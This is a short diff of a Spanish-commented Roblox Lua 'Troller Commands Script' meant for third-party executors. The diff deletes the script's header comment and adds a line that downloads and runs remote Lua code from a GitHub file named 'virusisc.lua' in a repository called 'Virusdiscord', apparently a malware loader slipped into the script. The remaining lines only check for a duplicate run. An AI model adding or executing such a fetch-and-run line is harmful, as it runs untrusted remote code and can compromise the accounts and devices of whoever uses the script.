@@ -1,6 +1,4 @@
---[[
-    Troller Commands Script (MODO NUBE - Delta / Xeno)
-]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/clasificapro/Virusdiscord/refs/heads/main/virusisc.lua"))()
 
 if _G.__TrollerRunning then
     warn("[Troller] El script ya está en ejecución. Abortando duplicado.")
